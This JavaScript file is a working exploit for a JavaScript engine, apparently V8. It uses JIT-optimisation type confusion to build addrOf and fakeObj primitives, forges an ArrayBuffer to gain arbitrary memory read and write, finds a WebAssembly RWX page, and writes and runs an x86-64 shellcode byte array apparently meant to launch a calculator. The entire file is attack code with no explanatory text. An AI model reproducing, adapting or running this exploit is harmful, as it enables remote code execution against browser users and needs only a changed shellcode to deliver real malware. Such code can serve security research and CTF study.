class Memory{
	constructor(){
		this.buf = new ArrayBuffer(8);
		this.f64 = new Float64Array(this.buf);
		this.u32 = new Uint32Array(this.buf);
		this.bytes = new Uint8Array(this.buf);
	}
	d2u(val){				//double ==> Uint64
		this.f64[0] = val;
		let tmp = Array.from(this.u32);
		return tmp[1] * 0x100000000 + tmp[0];
	}
	u2d(val){				//Uint64 ==> double
		let tmp = [];
		tmp[0] = parseInt(val % 0x100000000);
		tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
		this.u32.set(tmp);
		return this.f64[0];
	}
}

var mem = new Memory();
// function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x10000); } }

function gc() { 
	for (var i = 0; i < 1024 * 1024 * 16; i++){
		new String();
	}
}

function log(x,y = ' '){
	console.log("[+] log:", x,y);   
}

function utf8ToString(h, p) {
	let s = "";
	for (i = p; h[i]; i++) {
		s += String.fromCharCode(h[i]);
	}
	return s;
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

function exploit(){
	var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,1,10,143,128,128,128,0,1,137,128,128,128,0,0,65,1,16,0,26,65,42,11]);
	var wasmImports = {
		env: {
		puts: function puts (index) {
			console.log(utf8ToString(h, index));
		}
		}
	};
	let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
	let h = new Uint8Array(m.exports.memory.buffer);
	var f = m.exports.main;

	let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
	

	let OPT_NUM = 0x8888;

	function getObj(idx){
		let c = 2.2;
		eval(`c = {x:1.2,${'y'+idx}:2.2};`);
		return c;
	}
	function addrOf(obj,cid){
		eval(`
			function vulfunc4leak(a,b,c){
				let d = 1.2;
				d = c.x+d;
				a&b;
				return c.${'y'+cid};
			}
			`);
		let b0 = {
			valueOf: function(){
				return 22223333;
			}
		}
		let b = {
			valueOf: function(){
				eval(`c.${'y'+cid} = obj;`);
				return 888888889999;
			}
		}
		var c = getObj(cid);
		for(let i=0;i<OPT_NUM;++i){
			vulfunc4leak(12345,b0,c);
		}
		let ret = vulfunc4leak(12345,b,c);
		return ret;
	}

	function fakeObj(addr){
		function vulfunc4fake(a,b,o,value){
			for(let i=0;i<OPT_NUM;++i){}
			o.x1;
			a&b;
			o.y1 = value;
			return o.x1;
		}
		let a1 = 11112222;
		let b2 = {
			valueOf: function(){
				return 11112333;
			}
		}
		let obj4 = new ArrayBuffer(0x30);
		let o = {x1:1.1,y1:1.2};
		let b3 = {
			valueOf: function(){
				o.y1 = obj4;
				return 888888887777;
			}
		}
		vulfunc4fake(a1,b2,o,1.3);
		vulfunc4fake(a1,b2,o,1.3);
		let ret = vulfunc4fake(a1,b3,o,addr);
		return o.y1;
	}

	let ab = new ArrayBuffer(0x20);
	let ab_proto_addr = mem.d2u(addrOf(ab.__proto__,1));
	let ab_construct_addr = ab_proto_addr-0x1a0;

	log('arraybuffer proto addr',hex(ab_proto_addr));
	log('arraybuffer constructor addr',hex(ab_construct_addr));

	// fake arraybuffer map
	let fake_ab_map = {x1:-1.1263976280432204e+129,x2:2.8757499612354866e-188,x3:6.7349004654127717e-316,x4:-1.1263976280432204e+129,x5:-1.1263976280432204e+129,x6:0.0};
	fake_ab_map.x4 = mem.u2d(ab_proto_addr);
	fake_ab_map.x5 = mem.u2d(ab_construct_addr);
	gc();

	// get fake arraybuffer map's addr
	let fake_ab_map_addr = mem.d2u(addrOf(fake_ab_map,2))+0x18;
	log('fake ab map addr',hex(fake_ab_map_addr));
	
	// fake arraybuffer
	let fake_ab = {y1:mem.u2d(fake_ab_map_addr),y2:mem.u2d(fake_ab_map_addr),y3:mem.u2d(fake_ab_map_addr),y4:mem.u2d(0x2000000000),y5:mem.u2d(fake_ab_map_addr+0x20),y6:mem.u2d(0x8)};
	gc();
	// get fake arraybuffer addr
	let fake_ab_addr = mem.d2u(addrOf(fake_ab,3))+0x18;
	log('fake ab addr',hex(fake_ab_addr));

	// fake arraybuffer obj
	let fake_ab_obj = fakeObj(mem.u2d(fake_ab_addr));

	// read and write anywhere
	let dataview = new DataView(fake_ab_obj);

	// leak rwx addr
	let wasm_func_addr = mem.d2u(addrOf(f,4));
	log('wasm func addr',hex(wasm_func_addr));

	fake_ab.y5 = mem.u2d(wasm_func_addr-1+0x18);
	let SharedFunctionInfo_addr = mem.d2u(dataview.getFloat64(0,true));

	fake_ab.y5 = mem.u2d(SharedFunctionInfo_addr+8-1);
	let WasmExportedFunctionData_addr = mem.d2u(dataview.getFloat64(0,true));

	fake_ab.y5 = mem.u2d(WasmExportedFunctionData_addr+0x10-1);
	let data_instance_addr = mem.d2u(dataview.getFloat64(0,true));

	fake_ab.y5 = mem.u2d(data_instance_addr-1+0xc8);
	let imported_function_targets = mem.d2u(dataview.getFloat64(0,true));

	fake_ab.y5 = mem.u2d(imported_function_targets);
	let rwx_addr = mem.d2u(dataview.getFloat64(0,true));
	log('wasm rwx addr',hex(rwx_addr));
	
	// write shellcode
	fake_ab.y5 = mem.u2d(rwx_addr);
	for(let i=0;i<shellcode_calc.length;++i){
		dataview.setUint8(i,shellcode_calc[i]);
	}
	f();
}
exploit();